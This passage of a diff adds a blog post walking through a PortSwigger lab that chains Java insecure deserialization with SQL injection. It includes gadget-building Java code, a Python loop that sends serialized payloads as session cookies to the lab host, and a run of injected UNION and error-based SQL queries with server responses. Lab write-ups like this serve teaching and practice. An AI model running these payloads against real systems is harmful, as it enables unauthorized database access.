+        <span style="color:#66d9ef">return</span> product<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>This class is certainly <strong>vulnerable and exploitable</strong>, since it is kind of overriding the actual <code>readObject()</code> method and executing a <strong>SQL query</strong> with a private variable id set <strong>by a public function</strong>.</p>
+<h2 id="gadget-development">Gadget Development</h2>
+<p>To make sure everything works out, we must match the structure that the backend is following. A main class would call a package called <strong>data.productcatalog</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir data/
+mkdir data/productcatalog/
+
+touch data/productcatalog/ProductTemplate.java
+touch Main.java
+</code></pre></div><h3 id="to-be-serialized-class-dataproductcatalogproducttemplatejava">to-be-serialized Class (data/productcatalog/ProductTemplate.java)</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> data.productcatalog<span style="color:#f92672">;</span>
+
+<span style="color:#f92672">import</span> java.io.Serializable<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ProductTemplate</span> <span style="color:#66d9ef">implements</span> Serializable <span style="color:#f92672">{</span>
+
+    <span style="color:#75715e">// Internal Server Error java.io.InvalidClassException: data.productcatalog.ProductTemplate; local class incompatible: stream classdesc serialVersionUID = -1893908778312165970, local class serialVersionUID = 1
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> 1L<span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> String id<span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ProductTemplate</span><span style="color:#f92672">(</span>String id<span style="color:#f92672">){</span>
+        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">id</span> <span style="color:#f92672">=</span> id<span style="color:#f92672">;</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>As you can see, this is a minified version of <code>ProductTemplate.java</code>’s main class, since everything that was not needed has been removed.</p>
+<ul>
+<li>Notice <code>static final long serialVersionUID = 1L;</code> - this variable has to be set due to the random generation of a <em>version number</em> each time a class is executed. As we are deserializing the same class, this flag must be set. (This variable is also set in the backend, as you can see in <code>ProductTemplate.java</code>)</li>
+</ul>
+<h3 id="main-class">Main Class</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">import</span> data.productcatalog.ProductTemplate<span style="color:#f92672">;</span> <span style="color:#75715e">//Importing to-Serialize class
+</span><span style="color:#75715e"></span><span style="color:#f92672">import</span> java.io.ByteArrayInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ByteArrayOutputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ObjectInputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.ObjectOutputStream<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.io.Serializable<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.util.Base64<span style="color:#f92672">;</span>
+<span style="color:#f92672">import</span> java.util.Scanner<span style="color:#f92672">;</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Main</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+        Scanner in <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Scanner<span style="color:#f92672">(</span>System<span style="color:#f92672">.</span><span style="color:#a6e22e">in</span><span style="color:#f92672">);</span> <span style="color:#75715e">//Reading stdin
+</span><span style="color:#75715e"></span>        ProductTemplate originalObject <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProductTemplate<span style="color:#f92672">(</span>in<span style="color:#f92672">.</span><span style="color:#a6e22e">nextLine</span><span style="color:#f92672">());</span> <span style="color:#75715e">//Creating Object with stdin
+</span><span style="color:#75715e"></span>        String serializedObject <span style="color:#f92672">=</span> serialize<span style="color:#f92672">(</span>originalObject<span style="color:#f92672">);</span> <span style="color:#75715e">//Getting serialized object
+</span><span style="color:#75715e"></span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>serializedObject<span style="color:#f92672">);</span> <span style="color:#75715e">//Printing serialized object
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">serialize</span><span style="color:#f92672">(</span>Serializable ser<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span> <span style="color:#75715e">//https://stackoverflow.com/questions/134492/how-to-serialize-an-object-into-a-string
+</span><span style="color:#75715e"></span>        ByteArrayOutputStream baos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream<span style="color:#f92672">(</span>512<span style="color:#f92672">);</span> <span style="color:#75715e">//Creating (ByteArray) Output Stream
+</span><span style="color:#75715e"></span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span>baos<span style="color:#f92672">);</span> <span style="color:#75715e">//Creating (Object) Output Stream
+</span><span style="color:#75715e"></span>        oos<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>ser<span style="color:#f92672">);</span> <span style="color:#75715e">//Write Binary Object
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">getEncoder</span><span style="color:#f92672">().</span><span style="color:#a6e22e">encodeToString</span><span style="color:#f92672">(</span>baos<span style="color:#f92672">.</span><span style="color:#a6e22e">toByteArray</span><span style="color:#f92672">());</span> <span style="color:#75715e">//Base64-Encoding Object
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><h2 id="testing-1">Testing</h2>
+<p>Before starting our testing stage, I usually code a little <strong>pseudo-shell</strong> to quickly communicate with the server and read the responses.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> requests <span style="color:#66d9ef">as</span> r
+<span style="color:#f92672">import</span> os
+
+session <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;your-session&#34;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">.web-security-academy.net/&#34;</span>
+
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;rm Main.class 2&gt;/dev/null&#34;</span>) <span style="color:#75715e"># Remove previous class to avoid Java overhuman errors.</span>
+    payload <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;SELECT * FROM products WHERE id = &#39;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#34;&#39;&#34;</span>)<span style="color:#f92672">.</span>rstrip() <span style="color:#75715e"># Replace &#34; to avoid error with echo formatting.</span>
+    base64_object <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;&#34;&#34;javac Main.java &amp;&amp; echo &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34; | java Main&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> payload)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>rstrip() <span style="color:#75715e"># Read Base64-Encoded Object.</span>
+
+    cookies <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#34;session&#34;</span>: base64_object
+    }
+
+    req <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>get(url, cookies<span style="color:#f92672">=</span>cookies)
+    print(req<span style="color:#f92672">.</span>text)
+</code></pre></div><ul>
+<li>Special mention to my <a href="https://twitter.com/Ripp3rsCTF" target="_blank">teammates</a>, specially <a href="https://twitter.com/danielcues" target="_blank">@danielcues</a>, who helped me solving an error in Java and it actually was me forgetting to format the line calling Java with the payload. <code>os.popen(&#34;&#34;&#34;javac Main.java &amp;&amp; echo &#34;%s&#34; | java Main&#34;&#34;&#34; % payload)</code> (Sorry for being so dumb lol)</li>
+</ul>
+<p>Let’s try sending some random values and analysing the responses.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate cannot be <span style="color:#66d9ef">cast</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser (<span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser <span style="color:#66d9ef">are</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">unnamed</span> module <span style="color:#66d9ef">of</span> loader <span style="color:#f92672">&amp;</span>apos;app<span style="color:#f92672">&amp;</span>apos;)<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>
+
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: unterminated quoted string <span style="color:#66d9ef">at</span> <span style="color:#66d9ef">or</span> near <span style="color:#f92672">&amp;</span>quot;<span style="color:#f92672">&amp;</span>apos;<span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span>apos;<span style="color:#f92672">&amp;</span>apos; <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span>quot; <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">35</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate cannot be <span style="color:#66d9ef">cast</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser (<span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser <span style="color:#66d9ef">are</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">unnamed</span> module <span style="color:#66d9ef">of</span> loader <span style="color:#f92672">&amp;</span>apos;app<span style="color:#f92672">&amp;</span>apos;)<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span><span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate cannot be <span style="color:#66d9ef">cast</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">class</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser (<span style="color:#66d9ef">data</span>.productcatalog.ProductTemplate <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">data</span>.<span style="color:#66d9ef">session</span>.token.AccessTokenUser <span style="color:#66d9ef">are</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">unnamed</span> module <span style="color:#66d9ef">of</span> loader <span style="color:#f92672">&amp;</span>apos;app<span style="color:#f92672">&amp;</span>apos;)<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>Thanks to the output, we can now know that a <code>boolean</code> injection is impossible, therefore we will be exploiting an <code>error-based</code> injection.</p>
+<pre tabindex="0"><code>Displayed when the query causes no error:
+&lt;p class=is-warning&gt;Internal Server Error&lt;/p&gt;
+&lt;p class=is-warning&gt;class data.productcatalog.ProductTemplate cannot be cast to class data.session.token.AccessTokenUser (data.productcatalog.ProductTemplate and data.session.token.AccessTokenUser are in unnamed module of loader &amp;apos;app&amp;apos;)&lt;/p&gt;
+
+Displayed when an error occurs:
+&lt;p class=is-warning&gt;Internal Server Error&lt;/p&gt;
+&lt;p class=is-warning&gt;java.io.IOException: org.postgresql.util.PSQLException: ERROR: error-here Position: X&lt;/p&gt;
+</code></pre><h2 id="table-discovery">Table discovery</h2>
+<p>Since the query we already know <code>String sql = String.format(&#34;SELECT * FROM products WHERE id = &#39;%s&#39; LIMIT 1&#34;, id);</code> doesn’t hardcode the columns it will be returning, we will have to, at least, enumerate the amount of them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">each</span> <span style="color:#66d9ef">UNION</span> query must have the same number <span style="color:#66d9ef">of</span> columns. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">51</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>This error will appear everytime we don’t specify the same amount of columns in the second <code>UNION query</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">each</span> <span style="color:#66d9ef">UNION</span> query must have the same number <span style="color:#66d9ef">of</span> columns. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">51</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+...
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">51</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>There we go, when the second query returns 8 columns, the error changes. According to the error, we are facing a <strong>UNION type mismatch</strong>, since there’s at least one column in the first query that is a string.</p>
+<p>To propperly continue, let’s enumerate the amount of columns that are returning a string instead of an integer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">55</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">59</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: 
+<span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">67</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;4&#39;</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">69</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;4&#39;</span>,<span style="color:#e6db74">&#39;5&#39;</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>Internal Server Error<span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span>p <span style="color:#66d9ef">class</span><span style="color:#f92672">=</span><span style="color:#66d9ef">is</span><span style="color:#f92672">-</span>warning<span style="color:#f92672">&gt;</span>java.io.IOException: org.postgresql.util.PSQLException: ERROR: <span style="color:#66d9ef">UNION</span> types character varying <span style="color:#66d9ef">and</span> integer cannot be matched. <span style="color:#66d9ef">Position</span>: <span style="color:#ae81ff">71</span><span style="color:#f92672">&lt;/</span>p<span style="color:#f92672">&gt;</span>
+
+<span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;4&#39;</span>,<span style="color:#e6db74">&#39;5&#39;</span>,<span style="color:#e6db74">&#39;6&#39;</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">8</span><span style="color:#75715e">--
+</span><span style="color:#75715e"></span>
